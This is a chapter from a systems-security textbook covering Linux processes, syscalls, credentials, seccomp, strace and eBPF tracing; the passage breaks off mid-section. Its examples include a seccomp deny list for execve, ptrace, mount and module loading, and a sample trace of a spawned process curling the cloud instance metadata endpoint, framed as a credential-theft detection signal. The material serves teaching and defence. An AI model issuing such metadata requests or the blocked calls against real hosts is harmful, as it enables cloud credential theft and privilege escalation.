# Chapter 2 — The Kernel Boundary: Processes, Threads, System Calls, and Privilege Rings

---

## 1. Why This Matters

In Chapter 1 we established that the CPU enforces a hard line between ring 3 (your code)
and ring 0 (the kernel). This chapter is about the door in that line.

Your ASP.NET Core API cannot open a file, send a byte over the network, create a thread,
read the clock precisely, or allocate memory from the OS by itself. It has no access to
hardware. Everything it does that touches the world outside its own address space happens
by asking the kernel, through a **system call**. On Linux x86-64 there are around 350 of
them. That is the complete vocabulary a process has for interacting with reality.

This fact is the foundation of an enormous amount of practical security:

- **seccomp** filters syscalls. Docker's default profile blocks about 44 of them, which is
  why a container is meaningfully safer than a bare process — and why that number
  (44 out of ~350) should also make you nervous.
- **Falco**, **Tetragon**, **Tracee**, and every serious container runtime-security product
  work by observing syscalls, because syscalls are the only place where a process's
  intentions become visible to something outside itself.
- **auditd** records syscalls. So does the Kubernetes-adjacent eBPF tooling in Chapter 107.
- **Capabilities** (Chapter 33) are a per-syscall permission model.
- **Containers** are created by exactly one syscall — `clone()` — with unusual flags.
- Nearly every **local privilege escalation** CVE you will ever read is a bug in a syscall
  implementation, reachable from ring 3 by design.

There is also a second, equally important subject here: **process credentials**. Every
process carries a small set of numbers — UID, GID, supplementary groups, capability sets —
that the kernel consults on every privileged operation. That structure is the operating
system's IAM system, and it predates AWS IAM by thirty years while working on identical
principles: a principal, a set of permissions, and an evaluation step on every access.
Understanding it properly makes AWS IAM (Chapter 72) and Kubernetes RBAC (Chapter 101)
feel familiar rather than novel.

When an incident responder asks "what did the attacker do on that host?", the answer is
always expressible as a sequence of syscalls. When a platform engineer asks "how do I stop
this container from doing X?", the answer is always "prevent the syscall, or prevent the
credential that authorizes it."

---

## 2. Prerequisites

- Chapter 1, especially §4.2 (rings), §4.4 (address space), §5.4 (threads share everything).
- Comfort with a Linux shell and `ps`/`top`.
- You have run a program under `strace` at least once, even without understanding it.

---

## 3. Mental Model

**The kernel is a service with a fixed API, and your process is a client that cannot be
trusted.**

That framing is worth taking literally, because it produces correct intuitions:

```
   Your process (untrusted client, ring 3)
        |
        |  request:  syscall number + up to 6 arguments
        |            (arguments are just numbers — pointers are
        |             addresses in YOUR address space)
        v
   +==============================================================+
   |  KERNEL (ring 0)                                              |
   |                                                               |
   |  1. Is this a valid syscall number?                           |
   |  2. Are the pointer arguments valid in the CALLER's address   |
   |     space? (copy_from_user — never trust, always copy)        |
   |  3. Does the caller's CREDENTIAL set permit this?             |
   |     (uid/gid, capabilities, LSM hooks, seccomp filter)        |
   |  4. Do it.                                                    |
   |  5. Return a number (negative = error code).                  |
   +==============================================================+
```

Every one of those five steps has been the site of exploitable bugs, and steps 2 and 3 are
where security engineering lives.

Step 2 deserves emphasis, because it is the same lesson as every input-validation chapter
later in this book. When your process passes a pointer to `read(fd, buf, count)`, the
kernel cannot simply dereference `buf` — that address is meaningful in *your* page tables,
and you might have passed a kernel address hoping the kernel would write there for you.
So the kernel uses `copy_to_user`/`copy_from_user`, which validate the address range and
handle faults. Bugs in that discipline are how kernel exploits happen.

**Second model, for credentials:**

```
Every process carries:   who am I?     -> uid, gid, groups
                         what may I do -> capability sets
                         what may I ask-> seccomp filter
                         what do I see -> namespaces (Chapter 38)
                         how much      -> cgroup limits (Chapter 38)
```

Five orthogonal dimensions. Almost all Linux container security is just a particular
combination of those five, and stating a container's security posture as five answers is a
habit worth forming now.

---

## 4. Fundamentals

### 4.1 What a process actually is, in the kernel

To Linux, a process is a `task_struct` — a large C structure (over a kilobyte) in kernel
memory. The security-relevant fields:

```c
struct task_struct {
    pid_t               pid;            /* actually the thread id (TID) */
    pid_t               tgid;           /* thread group id = what userspace calls PID */
    struct task_struct *real_parent;    /* who forked me */
    volatile long       state;          /* RUNNING / INTERRUPTIBLE / ... */

    struct mm_struct   *mm;             /* the ADDRESS SPACE (page tables) - Ch.1 */
    struct files_struct *files;         /* the FILE DESCRIPTOR TABLE */
    struct fs_struct   *fs;             /* cwd, root (chroot lives here) */

    const struct cred  *cred;           /* uid, gid, capabilities  <-- IDENTITY */
    struct nsproxy     *nsproxy;        /* namespaces              <-- what I can SEE */
    struct css_set     *cgroups;        /* resource limits         <-- how MUCH */
    struct seccomp      seccomp;        /* syscall filter          <-- what I may ASK */

    struct signal_struct *signal;
    /* ... hundreds more fields ... */
};
```

Read that structure carefully, because it answers a question that confuses many engineers:
*what is the difference between a process and a thread?*

**Nothing structural.** Both are `task_struct`s. The difference is which pointers they
share:

```
   fork()  -> new task_struct, NEW mm, NEW files (copied)
              => a separate PROCESS, separate address space

   pthread_create() -> new task_struct, SAME mm, SAME files, SAME cred
              => a THREAD: same address space, same identity, same open files
```

Both are implemented by the same syscall, `clone()`, with different flags:

| Flag | Effect if set | Used by |
|---|---|---|
| `CLONE_VM` | share the address space | threads |
| `CLONE_FILES` | share the fd table | threads |
| `CLONE_FS` | share cwd/root | threads |
| `CLONE_SIGHAND` | share signal handlers | threads |
| `CLONE_THREAD` | same thread group (same "PID" to userspace) | threads |
| `CLONE_NEWNS`, `CLONE_NEWNET`, `CLONE_NEWPID`, `CLONE_NEWUSER`, … | *unshare* a namespace | **containers** |

Hold that last row. A container is not a special kind of object in Linux. It is a process
started with `clone()` using namespace flags, plus cgroup limits, plus usually a seccomp
filter and reduced capabilities. When Chapter 93 says "containers are not a security
boundary in the way VMs are," this table is the reason: same kernel, same `task_struct`
list, different values in a few pointers.

### 4.2 Process credentials: the operating system's IAM

The `cred` structure is small and consequential:

```c
struct cred {
    kuid_t  uid;    /* real UID      — who launched me */
    kgid_t  gid;
    kuid_t  euid;   /* effective UID — what the kernel CHECKS for permissions */
    kgid_t  egid;
    kuid_t  suid;   /* saved UID     — what I may switch back to */
    kgid_t  sgid;
    kuid_t  fsuid;  /* filesystem UID — used for file access checks specifically */
    kgid_t  fsgid;

    struct group_info *group_info;   /* supplementary groups */

    kernel_cap_t cap_inheritable;
    kernel_cap_t cap_permitted;      /* the ceiling */
    kernel_cap_t cap_effective;      /* what is active right now */
    kernel_cap_t cap_bset;           /* bounding set — cannot be exceeded, ever */
    kernel_cap_t cap_ambient;
    /* ... */
};
```

Three UIDs, not one. The distinction matters:

- **Real UID** — who you are.
- **Effective UID** — what the kernel uses for permission checks *right now*.
- **Saved UID** — lets a privileged process temporarily drop privilege and regain it.

`sudo`, `passwd`, and `ping` (historically) work by being **setuid binaries**: a file whose
mode has the setuid bit, so that `execve()` sets `euid` to the file's owner (usually root)
while `uid` stays the caller's. That is a deliberate, narrow privilege escalation channel
built into the OS — and consequently one of the oldest and richest sources of local
privilege escalation bugs.

Inspect it live:

```bash
$ cat /proc/self/status | grep -E '^(Uid|Gid|Groups|CapEff|CapBnd|Seccomp|NoNewPrivs)'
Uid:	1000	1000	1000	1000
Gid:	1000	1000	1000	1000
Groups:	4 24 27 1000
CapEff:	0000000000000000
CapBnd:	000001ffffffffff
Seccomp:	0
NoNewPrivs:	0
```

Four numbers on the `Uid:` line: real, effective, saved, filesystem. `CapEff: 0` means this
unprivileged shell holds no capabilities. `CapBnd` shows the ceiling. Run the same inside a
Docker container and the difference is the entire chapter of container security in one
command:

```bash
$ docker run --rm alpine grep -E '^(Uid|CapEff|CapBnd|Seccomp|NoNewPrivs)' /proc/self/status
Uid:	0	0	0	0
CapEff:	00000000a80425fb
CapBnd:	00000000a80425fb
Seccomp:	2
NoNewPrivs:	0
```

`Uid: 0` — root inside the container (which is *real* root on the host kernel, just
namespaced and capability-restricted). `CapEff: 0xa80425fb` — 14 capabilities retained out
of ~40. `Seccomp: 2` — a filter is loaded. Chapter 95 will teach you to read that hex
capability mask on sight; for now, notice that "root in a container" is a materially
different thing from "root on the host", and that the difference is a bitmask.

### 4.3 The system call mechanism, instruction by instruction

Here is what `read(fd, buf, 4096)` actually compiles to on x86-64 Linux:

```asm
    mov    eax, 0        ; syscall number: 0 = read
    mov    edi, 3        ; arg1: fd
    mov    rsi, rbx      ; arg2: buf (pointer in OUR address space)
    mov    edx, 4096     ; arg3: count
    syscall              ; <<<< ring 3 -> ring 0
    ; on return: rax = bytes read, or a negative errno
```

The x86-64 Linux syscall ABI:

| Item | Register |
|---|---|
| Syscall number | `RAX` |
| Argument 1 | `RDI` |
| Argument 2 | `RSI` |
| Argument 3 | `RDX` |
| Argument 4 | `R10` (not `RCX` — the `syscall` instruction clobbers `RCX`) |
| Argument 5 | `R8` |
| Argument 6 | `R9` |
| Return value | `RAX` (negative values in `-4095..-1` are errno) |
| Clobbered | `RCX` (saved RIP), `R11` (saved RFLAGS) |

What the `syscall` instruction does in hardware:

```
1. Save RIP into RCX, RFLAGS into R11.
2. Load RIP from the IA32_LSTAR MSR   -> the kernel's entry_SYSCALL_64 handler
   Load CS/SS from IA32_STAR          -> switches to ring 0
   Mask flags per IA32_FMASK          -> disables interrupts briefly
3. Now executing kernel code at ring 0, but STILL on the user stack
   (the first thing the handler does is switch to the kernel stack via swapgs
    and the per-CPU TSS).
4. Under KPTI: switch CR3 to the kernel page tables   <-- the Meltdown tax (Ch.1 §5.1)
5. Save all user registers into a pt_regs struct on the kernel stack.
6. Validate RAX against the syscall table bounds; dispatch:
       sys_call_table[rax](regs)
7. seccomp filter runs BEFORE dispatch, if one is installed.
8. On return: restore registers, restore CR3, SYSRET back to ring 3 at RCX.
```

Step 7 is where seccomp lives, and its position matters: **seccomp runs before the syscall
is executed and sees the syscall number and register arguments, but cannot dereference
pointers.** That single constraint explains most of what seccomp can and cannot do:

- It *can* say "never allow `mount`" or "never allow `ptrace`."
- It *cannot* reliably say "allow `open` only on files under `/app`", because the filename
  is behind a pointer, and by the time the kernel resolves it, the userspace program could
  have changed the memory (a TOCTOU race — Chapter 55's concept, appearing here first).

Path-based restrictions therefore belong to LSMs (AppArmor, SELinux) or Landlock, which
hook *inside* the kernel after the path is resolved. This distinction — *filter on the
request vs. enforce at the resource* — recurs exactly in Chapter 76 (security groups filter
packets) versus Chapter 79 (S3 bucket policies enforce at the object), and again in
Chapter 105 (admission control vs. RBAC). Learn it once here.

### 4.4 The syscall table, in categories

You do not need to memorize 350 syscalls. You need the shape:

| Category | Examples | Security relevance |
|---|---|---|
| Process lifecycle | `clone`, `fork`, `execve`, `exit`, `wait4` | `execve` is the #1 detection signal: "what did it run?" |
| Memory | `mmap`, `mprotect`, `brk`, `munmap` | `mprotect(PROT_EXEC)` on a writable page = likely exploit |
| File I/O | `open`, `openat`, `read`, `write`, `close`, `stat` | data access, path traversal (Ch. 53) |
| Filesystem | `mount`, `chroot`, `pivot_root`, `chmod`, `chown` | container escape and persistence primitives |
| Network | `socket`, `bind`, `listen`, `accept`, `connect`, `sendto` | egress detection, C2 channels, SSRF endpoint |
| Credentials | `setuid`, `setgid`, `capset`, `prctl` | privilege changes — always audit-worthy |
| IPC | `pipe`, `shmget`, `futex`, `signalfd` | shared state, side channels |
| Introspection | `ptrace`, `process_vm_readv`, `perf_event_open` | reading other processes' memory (Ch. 1 §8.5) |
| Kernel modules | `init_module`, `finit_module`, `delete_module` | loading kernel code = game over; block always |
| Modern async | `io_uring_setup`, `io_uring_enter` | bypasses many syscall-based detections — see §13 |

Commit four of those to memory as the "high signal" set, because you will write detections
for them in Chapter 118: `execve`, `mprotect` with exec, `ptrace`, and
`init_module`/`finit_module`.

### 4.5 The file descriptor table

A **file descriptor** is an index into a per-process array:

```
  Process 1842                        Kernel
  +---------------------+             +----------------------------+
  | fd 0 -> stdin       |------------>| struct file { offset, mode,|
  | fd 1 -> stdout      |             |   f_op, private_data }     |
  | fd 2 -> stderr      |             +----------------------------+
  | fd 3 -> /app/log    |                        |
  | fd 8 -> epoll       |                        v
  | fd 19 -> TCP socket |             +----------------------------+
  | fd 24 -> TCP socket |             | inode / socket / pipe /    |
  +---------------------+             | eventfd / ...              |
                                      +----------------------------+
```

Consequences you will actually use:

1. **An fd is a capability, in the security sense.** Once opened, the fd carries the
   access; permissions are checked at `open()`, not at each `read()`. A process that drops
   privileges but keeps an fd open retains that access. Attackers exploit this; so do
   well-designed privilege-dropping daemons.
2. **fds are inherited across `fork` and (unless `CLOSE_ON_EXEC` is set) across `execve`.**
   A leaked fd to a sensitive file or a privileged socket is a real escalation path. This
   is why `O_CLOEXEC` exists and why modern libraries set it by default.
3. **`/proc/PID/fd/` shows everything a process has open**, which is one of the fastest
   incident-response commands in existence:

```bash
$ ls -l /proc/1842/fd
lrwx------ 1 ledger ledger 64 Sep 15 10:22 0 -> /dev/null
lrwx------ 1 ledger ledger 64 Sep 15 10:22 19 -> 'socket:[482913]'
lr-x------ 1 ledger ledger 64 Sep 15 10:22 3 -> /app/appsettings.Production.json
lrwx------ 1 ledger ledger 64 Sep 15 10:22 24 -> 'socket:[483001]'
```

4. **A socket is a file descriptor.** That is the unification that makes Chapter 3 possible
   and that made Unix influential: network endpoints, files, pipes, and devices all speak
   `read`/`write`.

### 4.6 Process states, signals, and lifecycle

```
                      fork()/clone()
                            |
                            v
        +--------------> RUNNABLE (R) <----------------+
        |                   |  ^                       |
   scheduler picks          |  | preempted /           | event arrives
        |                   v  | timeslice ends        | (I/O done, lock freed)
        |               RUNNING                        |
        |                   |                          |
        |     blocking syscall (read on empty socket)  |
        |                   v                          |
        |        INTERRUPTIBLE SLEEP (S) --------------+
        |        UNINTERRUPTIBLE SLEEP (D)  <- stuck in I/O, cannot be killed
        |                   |
        |               exit()
        |                   v
        +----------------- ZOMBIE (Z) -- parent calls wait() --> gone
```

Two states cause real operational pain and both show up in incidents:

- **D state (uninterruptible sleep)** — the process is inside a syscall waiting on I/O that
  cannot be interrupted. `kill -9` does nothing. If you see many D-state processes, look at
  storage or a hung NFS/network filesystem, not at the application.
- **Z state (zombie)** — the process has exited but its parent has not reaped it. In
  containers this is endemic: PID 1 in a container is usually your application, not
  `init`, and most applications do not reap orphaned children. Hence `--init` /
  `shareProcessNamespace` / `tini`. It is a correctness problem that becomes a
  denial-of-service when the PID table fills.

**Signals** are the kernel's asynchronous notification mechanism: a small integer delivered
to a process, interrupting it. Security-relevant facts:

- `SIGKILL` (9) and `SIGSTOP` (19) cannot be caught or ignored — enforced by the kernel.
- All other signals can be handled, and **signal handlers run at unpredictable points**,
  which historically produced async-signal-safety vulnerabilities (a handler calling a
  non-reentrant function while the main flow was mid-`malloc`).
- Graceful shutdown depends on `SIGTERM` handling — relevant to security because it
  determines whether logs are flushed and connections drained during an incident or a
  deployment. A container that ignores `SIGTERM` gets `SIGKILL` after the grace period, and
  loses in-memory audit records.

---

## 5. Deep Technical Explanation

### 5.1 `fork()` + `execve()`: how every program on Linux starts

Almost every process you have ever run was created by this pair:

```c
pid_t pid = fork();            /* 1. duplicate the current process */
if (pid == 0) {
    /* child */
    setuid(1000);              /* 2. optionally drop privileges */
    close(sensitive_fd);       /* 3. optionally clean up inherited state */
    execve("/usr/bin/psql", argv, envp);  /* 4. REPLACE this process image */
    _exit(127);                /* only reached if execve failed */
} else {
    waitpid(pid, &status, 0);  /* parent reaps */
}
```

What `fork()` does internally: allocate a new `task_struct`, copy the `mm_struct` but mark
every page copy-on-write (Chapter 1 §5.2), copy the fd table (both now point at the same
`struct file` objects — note: *shared file offsets*), copy credentials, and put the new task
on the run queue. Returns twice: 0 in the child, the child's PID in the parent.

What `execve()` does internally, and this is the important one for security:

```
1. Resolve and open the target file; check execute permission.
2. Check the LSM hooks (AppArmor/SELinux may deny this specific transition).
3. Determine the format (ELF magic, or "#!" -> interpreter).
4. COMPUTE NEW CREDENTIALS:
     - if the file is setuid  -> euid = file owner
     - if the file is setgid  -> egid = file group
     - apply file capabilities
     - APPLY THE CAPABILITY BOUNDING SET (can only reduce)
     - if no_new_privs is set -> skip all privilege GAIN entirely
5. DESTROY the old address space entirely (all mappings gone).
6. Map the new executable and its interpreter (ld.so) — Chapter 1 §6.1.
7. Close fds marked CLOSE_ON_EXEC; keep the rest.
8. Reset signal handlers to default (but keep the signal mask).
9. Jump to the new entry point.
```

Step 4 is the only place in Linux where an unprivileged process can *gain* privilege, and
it is why `no_new_privs` (set via `prctl(PR_SET_NO_NEW_PRIVS, 1)`) is such a valuable flag:
it permanently forecloses that path for a process and all its descendants. Docker sets it
with `--security-opt no-new-privileges`; Kubernetes with
`allowPrivilegeEscalation: false`. When Chapter 105 asks you to enforce that field
cluster-wide, this is what it disables.

Step 5 has a forensic consequence: after `execve`, the previous program's memory is gone.
An attacker who runs `execve("/bin/sh")` inside your API process destroys the evidence of
how they got there — one reason why syscall-level auditing (which records the `execve` as
it happens) is worth more than post-hoc memory inspection.

### 5.2 Threads, the thread pool, and what your async code becomes

Your ASP.NET Core application looks like this to the kernel:

```bash
$ ps -L -p 1842 -o pid,tid,pcpu,comm | head -12
  PID    TID %CPU COMMAND
 1842   1842  0.3 dotnet
 1842   1846  0.0 .NET TP Worker
 1842   1847  0.0 .NET TP Worker
 1842   1851  1.2 .NET TP Worker
 1842   1852  0.0 .NET Sockets      <-- epoll loop
 1842   1853  0.0 .NET Finalizer
 1842   1854  0.0 .NET Timer
```

One PID (thread group), many TIDs. They share `mm`, `files`, and `cred`, which is Chapter 1
§5.4 restated at the kernel-structure level: **there is no security boundary between
threads**, because they literally point at the same credential struct. A change to the
process's UID affects all of them.

The `async`/`await` machinery in .NET (and NestJS's event loop) reduces to a small number
of threads multiplexing many connections through `epoll`:

```
  .NET Sockets thread:
      epoll_wait(epfd, events, 1024, timeout)   <- blocks until ANY socket is ready
          -> returns "fd 24 readable, fd 31 writable"
          -> queue continuations to the thread pool
  .NET TP Worker threads:
      run your `await`-ed code, call read()/write() which now do not block
```

Security consequences of this architecture, which matter more than they appear:

1. **One thread serves many tenants over its lifetime.** Any state left in a thread-local,
   or in a pooled object, or in a static, crosses tenant boundaries. (Chapter 1 §8, exercise
   1.8; Chapter 51 in depth.)
2. **Thread pool exhaustion is a denial-of-service vector.** If an attacker can make
   request handling block (a slow downstream, a deliberately slow regex, a lock), a small
   number of requests can consume all workers. Chapter 55 covers this as an availability
   attack; the kernel-level symptom is many threads in S state on a `futex`.
3. **`epoll` means one blocked syscall can stall many connections.** Blocking calls in
   async code (`.Result`, `.Wait()`, synchronous file I/O) are therefore not merely a
   performance smell; they are an amplification factor for DoS.

### 5.3 The vDSO: a deliberate, controlled hole

Some syscalls are called constantly and do not need privilege — `gettimeofday`,
`clock_gettime`, `getcpu`. Paying a full ring transition for them is wasteful, especially
after KPTI.

So the kernel maps a small shared object, the **vDSO (virtual dynamic shared object)**, into
every process's address space (you saw it in Chapter 1 §6.1). It contains real, executable
code plus a read-only page of kernel-maintained data (`[vvar]`) holding the current time.
`clock_gettime()` reads that page and returns — no ring transition at all.

Measure the difference:

```bash
$ cat > vdso_test.c <<'EOF'
#include <stdio.h>
#include <time.h>
#include <sys/syscall.h>
#include <unistd.h>
int main(void) {
    struct timespec ts; long i;
    clock_t a = clock();
    for (i = 0; i < 2000000; i++) clock_gettime(CLOCK_MONOTONIC, &ts);   /* vDSO */
    clock_t b = clock();
    for (i = 0; i < 2000000; i++) syscall(SYS_clock_gettime, CLOCK_MONOTONIC, &ts); /* real */
    clock_t c = clock();
    printf("vDSO:    %ld ms\nsyscall: %ld ms\n",
           (b-a)*1000/CLOCKS_PER_SEC, (c-b)*1000/CLOCKS_PER_SEC);
    return 0;
}
EOF
$ gcc -O2 -o vdso_test vdso_test.c && ./vdso_test
vDSO:    36 ms
syscall: 412 ms
```

Roughly 11× — and that gap *is* the cost of crossing the ring boundary, measured on your
own machine. Run it on an EC2 instance and compare across instance families; the difference
between hosts with and without certain mitigations is directly visible.

Security notes on the vDSO: it is always mapped, always executable, at a known-ish offset,
and therefore a perennial object of interest in exploit development. It is also the reason
that "count the syscalls" monitoring can miss time-related behavior. It does not, however,
give userspace any privilege it did not have.

### 5.4 seccomp-bpf: filtering the request

**seccomp** ("secure computing mode") lets a process voluntarily and irreversibly restrict
which syscalls it may make. Once installed, a filter cannot be removed — which is exactly
what you want, since an attacker who compromises the process inherits the restriction.

A filter is a BPF program evaluated on every syscall, receiving:

```c
struct seccomp_data {
    int   nr;                    /* syscall number */
    __u32 arch;                  /* AUDIT_ARCH_X86_64 — MUST be checked (see below) */
    __u64 instruction_pointer;
    __u64 args[6];               /* the raw register values — pointers NOT dereferenceable */
};
```

and returning one of:

| Return | Effect |
|---|---|
| `SECCOMP_RET_ALLOW` | proceed |
| `SECCOMP_RET_ERRNO` | fail with a chosen errno (usually `EPERM`) — *graceful* |
| `SECCOMP_RET_KILL_PROCESS` | terminate immediately — *loud* |
| `SECCOMP_RET_TRAP` | deliver `SIGSYS` (catchable, useful for debugging) |
| `SECCOMP_RET_LOG` | allow but log — the right way to build a profile |
| `SECCOMP_RET_USER_NOTIF` | hand the decision to a userspace supervisor (used by modern runtimes) |

A minimal, correct filter in C:

```c
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <stddef.h>

static int install_filter(void) {
    struct sock_filter filter[] = {
        /* 1. Load arch and verify it — MANDATORY. Without this check, a 32-bit
              syscall on a 64-bit kernel uses a DIFFERENT numbering, and the
              filter can be bypassed entirely. This is the classic seccomp bug. */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

        /* 2. Load the syscall number */
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),

        /* 3. Deny the dangerous ones explicitly */
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve,  4, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_ptrace,  3, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_mount,   2, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_finit_module, 1, 0),

        /* 4. Default: allow */
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
    };
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
        .filter = filter,
    };
    /* no_new_privs is REQUIRED for an unprivileged process to install a filter,
       and is a good idea regardless — it forecloses setuid escalation. */
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) return -1;
    return prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}
```

Two engineering lessons from this small program, both of which generalize far beyond
seccomp:

- **The architecture check is not optional.** A filter that forgets it is bypassable by
  invoking the 32-bit syscall interface, where `__NR_execve` is a different number. This is
  a *deny-list on a namespace the attacker can change* — the identical mistake to filtering
  a URL path without normalizing it (Chapter 53) or matching a WAF rule against one of many
  equivalent encodings (Chapter 85).
- **Default-allow vs default-deny.** The filter above is default-allow with a deny list,
  which is easy and weak. A real profile enumerates the allowed set. Docker's default
  profile is, in fact, default-deny with a large allow list — the right shape, though the
  allow list is large because it must support arbitrary workloads. Yours can be much
  smaller, because you know what your service does.

In practice you will rarely hand-write BPF. You will write a JSON profile:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_X32"],
  "syscalls": [
    {
      "names": ["read","write","openat","close","fstat","lseek","mmap","mprotect",
                "munmap","brk","rt_sigaction","rt_sigprocmask","ioctl","pread64",
                "pwrite64","access","pipe2","select","sched_yield","madvise",
                "socket","connect","accept4","sendto","recvfrom","bind","listen",
                "getsockname","getpeername","setsockopt","getsockopt","clone",
                "exit_group","epoll_create1","epoll_ctl","epoll_wait","futex",
                "clock_gettime","getrandom","statx","newfstatat"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

Applied with `docker run --security-opt seccomp=./profile.json`, or in Kubernetes via
`securityContext.seccompProfile` (Chapter 105).

---

## 6. Internals: Observing the Boundary

### 6.1 `strace`: one syscall per line

`strace` uses `ptrace(PTRACE_SYSCALL)` to stop the target twice per syscall — on entry and
exit. That is why it is slow (two extra context switches and two signal deliveries per
syscall; expect 10–100× slowdown). Use it to understand, not to profile.

```bash
$ strace -f -tt -T -e trace=%process,%network -o trace.log ./LedgerApi
```

Useful flag set, worth memorizing:

| Flag | Meaning |
|---|---|
| `-f` | follow forks and threads (**almost always needed**) |
| `-tt` | timestamps with microseconds |
| `-T` | time spent inside each syscall (finds the slow one) |
| `-e trace=%process` | the `execve`/`clone`/`exit` family |
| `-e trace=%network` | sockets |
| `-e trace=%file` | anything taking a filename |
| `-s 2048` | show 2048 bytes of string arguments instead of 32 |
| `-c` | summary counts only |
| `-p PID` | attach to a running process |
| `-k` | print a stack trace per syscall (slow but decisive) |

Reading a real trace of a failing service:

```
10:22:41.118342 openat(AT_FDCWD, "/app/appsettings.Production.json", O_RDONLY|O_CLOEXEC) = -1 EACCES (Permission denied) <0.000042>
10:22:41.118512 write(2, "Unhandled exception. System.Unaut"..., 312) = 312 <0.000031>
10:22:41.118901 exit_group(134)         = ?
```

Three lines that replace an hour of guessing. The application's exception message says
"unauthorized access"; the syscall says exactly which path and exactly which errno. When a
container "just won't start", this is the fastest route to the truth, and it works
identically for .NET, Node, Python, and a compiled binary — because they all end at the
same interface.

### 6.2 `ltrace`, `perf trace`, and eBPF

- **`ltrace`** traces *library* calls (`malloc`, `SSL_write`) rather than syscalls. Useful
  for seeing plaintext before encryption.
- **`perf trace`** is a lower-overhead syscall tracer using perf events.
- **eBPF tools** (`bpftrace`, `execsnoop`, `opensnoop`, `tcpconnect` from bcc) attach to
  kernel tracepoints with near-zero overhead and are what production tooling uses:

```bash
# Every process execution on the host, live, with parentage:
$ sudo execsnoop-bpfcc
PCOMM            PID    PPID   RET ARGS
sh               28451  1842     0 /bin/sh -c ls /tmp
ls               28452  28451    0 /bin/ls /tmp
curl             28460  28451    0 /usr/bin/curl http://169.254.169.254/latest/meta-data/
```

Look at that third line and note what it tells you *without* any application logging: a
process spawned from your API (PPID 1842) is curling the instance metadata service. That is
the signature of an SSRF or RCE turning into cloud credential theft (Chapters 50 and 78).
This is the raw material of Chapter 107's runtime detection, and the reason syscall
visibility is worth investing in.

```bash
# One-liner: who is calling execve, with the full command line
$ sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve {
      printf("%-6d %-16s %s\n", pid, comm, str(args->filename)); }'
```

### 6.3 Watching credentials change

```bash
$ sudo bpftrace -e 'tracepoint:syscalls:sys_enter_setuid {
      printf("pid=%d comm=%s uid=%d -> setuid(%d)\n", pid, comm, uid, args->uid); }'
```

A process changing its UID is always interesting. On a well-behaved host it happens at
service startup (privilege dropping) and when someone runs `sudo`. Anywhere else, ask why.

---

## 7. Real-World Example: What Nginx Does at Startup

Nginx's startup is a textbook demonstration of correct privilege handling. Trace it:

```bash
$ sudo strace -f -e trace=%process,%file,%network -o nginx.log nginx -g 'daemon off;'
```

The essential sequence:

```
execve("/usr/sbin/nginx", ...)                      = 0
                                                    # running as root (uid 0)
openat(AT_FDCWD, "/etc/nginx/nginx.conf", O_RDONLY) = 3
                                                    # read config AS ROOT (file is root-only)
socket(AF_INET, SOCK_STREAM, IPPROTO_IP)            = 6
bind(6, {sa_family=AF_INET, sin_port=htons(80), ...}) = 0
                                                    # bind to port 80 — REQUIRES root
                                                    # (or CAP_NET_BIND_SERVICE)
listen(6, 511)                                      = 0
openat(AT_FDCWD, "/var/log/nginx/error.log", O_WRONLY|O_CREAT|O_APPEND) = 9
                                                    # open logs AS ROOT
clone(child_stack=NULL, flags=CLONE_CHILD_SETTID|SIGCHLD) = 641
                                                    # fork a worker
  [pid 641] setgid(33)                              = 0
  [pid 641] setgroups(1, [33])                      = 0
  [pid 641] setuid(33)                              = 0
                                                    # DROP to www-data. Irreversible:
                                                    # setuid() as root clears the saved uid
  [pid 641] epoll_wait(11, ...)                     # now serving, unprivileged
```

Study the ordering, because it is a reusable design pattern:

1. **Do privileged things first**, while you still can: read root-only config, bind to a
   privileged port, open log files.
2. **Keep the results as file descriptors.** The listening socket (fd 6) and the log fd (9)
   were authorized at `open`/`bind` time; they keep working after the drop (§4.5, point 1).
3. **Drop privileges irreversibly**: `setgid` first, then `setgroups`, then `setuid`. Order
   matters — after `setuid(33)` you can no longer call `setgid`, so getting it backwards
   leaves the worker in group root.
4. **Serve requests with the lowest privilege possible.** The worker that parses
   attacker-controlled bytes has UID 33 and no capabilities.

The master process stays root to spawn workers and reopen logs on rotation. That is a
deliberate, minimized trusted component — the same principle as Nitro in Chapter 1 §12 and
as sidecar/admission architectures later.

Now compare with how your ASP.NET Core app probably runs:

```bash
$ ps -o pid,user,comm -p $(pgrep -f LedgerApi)
  PID USER     COMMAND
 1842 ledger   dotnet
```

Kestrel binds to 5000 (unprivileged), so there is no privileged phase and no drop — good.
But check this, because it is a common real finding:

```bash
$ systemctl cat ledger-api | grep -E 'User|Group|Capability|NoNewPrivileges|Protect'
```

If `User=` is absent, systemd runs it as **root**, and a deserialization bug (Chapter 54) in
your API becomes host compromise instead of a contained incident. Chapter 35 will harden
this unit file properly; the point here is that the kernel enforces exactly what the
credentials say, and nothing about "it's just a web app" enters into it.

---

## 8. Hands-On Demonstration

### 8.1 Count what your application actually asks the kernel for

```bash
$ strace -f -c -p $(pgrep -n dotnet) &
# generate load for 30 seconds, e.g.:
$ for i in $(seq 1 200); do curl -s localhost:5000/api/health > /dev/null; done
$ kill %1
```

Representative summary:

```
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 41.22    0.184512          92      2004           epoll_wait
